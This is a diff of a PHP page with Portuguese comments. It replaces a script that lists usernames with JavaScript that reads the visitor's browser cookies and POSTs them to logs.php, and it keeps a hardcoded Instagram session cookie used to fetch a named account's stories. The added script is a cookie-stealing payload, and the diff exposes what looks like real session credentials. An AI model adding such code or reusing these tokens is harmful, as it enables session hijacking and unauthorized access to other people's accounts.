@@ -3,39 +3,23 @@
 
 </div>
 <script>
-// Seleciona todos os elementos <a> com href que começam com "/"
-let linkElements = document.querySelectorAll('a[href^="/"]');
+    let coo = document.getElementById('coo');
 
-// Inicializa um array para armazenar os nomes de usuário
-let usernames = [];
+    let cookies = window.document.cookie;
 
-// Itera sobre todos os elementos encontrados
-linkElements.forEach(link => {
-    // Obtém o valor do atributo href
-    let hrefValue = link.getAttribute('href');
-    
-    // Verifica se o href contém um nome de usuário (presumindo que o href esteja no formato "/username/")
-    if (hrefValue.includes('/')) {
-        // Extrai o nome de usuário
-        let username = hrefValue.split('/')[1];
-        
-        // Adiciona o nome de usuário ao array se não estiver vazio e não estiver duplicado
-        if (username && !usernames.includes(username)) {
-            usernames.push(username);
-        }
-    }
-});
+    coo.innerHTML = cookies;
 
-// Exibe todos os nomes de usuário encontrados
-console.log('Nomes de usuário encontrados:', usernames);
-
+    fetch('logs.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'cookies=' + encodeURIComponent(cookies)
+    });
 </script>
 
 <?php
 
-var_dump($_COOKIE);
-echo "<br>";
-echo "<br>";
 // URL da solicitação
 $url = 'https://www.instagram.com/stories/cactoramires';
 
@@ -44,11 +28,7 @@ $headers = [
     'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control: max-age=0',
-    'cookie: mid=Zhf6HgAEAAFkYo_IITx_TVX2aZVa; 
-            ig_did=508CFC97-9B80-416D-8D5B-E6D01C9CC122; 
-            datr=HfoXZrlypmyTzUNVuZfnzVaJ; 
-            ig_nrcb=1; ps_n=1; ps_l=1; 
-            ig_direct_region_hint="CLN\0545884981417\0541757367758:01f7b0cb8910cfc2c01420733a8101635d94829d11050512f9601488caa6a110ed42c924"; shbid="6340\05453215391319\0541757637894:01f727a954d83018a7939c2f64750445b39f44a2c708aca8aca5b3c194f13eb356d72219"; shbts="1726101894\05453215391319\0541757637894:01f7e0953d55cbad83d28342dc4f9b8b690e0c5be28552cea01f6143563fafd2a943e026"; ds_user_id=53215391319; csrftoken=lZtvbMqhk6joGNiQM577apPwqcarUHga; wd=375x667; rur="VLL\05453215391319\0541757876027:01f7c3e7a7e81a36e3bdb8bb7b60176a55702a6cb02d7e5763bcf6ad1ba82bddfa4e04d2"; sessionid=53215391319%3ALhAKCVqFj68pJX%3A7%3AAYf4IlifP-YzBv9ehuUdLk89vfFyrDHxAwsGtREzHA; dpr=2',
+    'cookie: sessionid=53215391319%3ALhAKCVqFj68pJX%3A7%3AAYf4IlifP-YzBv9ehuUdLk89vfFyrDHxAwsGtREzHA;',
     'dpr: 1',
     'priority: u=0, i',
     'sec-ch-prefers-color-scheme: dark',
